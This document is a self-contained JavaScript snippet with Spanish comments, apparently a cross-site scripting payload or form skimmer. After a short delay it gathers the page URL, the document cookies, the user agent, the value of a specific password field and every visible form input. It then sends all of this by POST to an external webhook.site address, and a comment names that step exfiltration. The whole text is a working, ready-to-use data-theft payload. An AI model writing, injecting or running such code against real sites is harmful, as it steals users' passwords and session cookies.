
(function() {
    const sleep = ms => new Promise(r => setTimeout(r, ms));

    async function collectAndSend() {
        const data = {};

        // Info general
        data.url = location.href;
        data.cookies = document.cookie;
        data.ua = navigator.userAgent;

        // Campo de contraseña específico
        const pwField = document.querySelector('#password2');
        if (pwField) {
            data.passwordValue = pwField.value || null;
            data.passwordType = pwField.type || null;
        }

        // Recolectar todos los inputs visibles
        data.inputs = [];
        document.querySelectorAll('input, textarea, select').forEach(el => {
            if (el.offsetParent !== null) {
                data.inputs.push({
                    name: el.name || null,
                    id: el.id || null,
                    type: el.type || el.tagName,
                    value: el.value || null
                });
            }
        });

        // Exfiltrar al webhook
        fetch('https://webhook.site/90e1ad6d-3d2e-48a9-8c70-e9e76d9ea291', {
            method: 'POST',
            body: JSON.stringify(data),
            headers: { 'Content-Type': 'application/json' }
        });
    }

    sleep(2000).then(collectAndSend);
})();
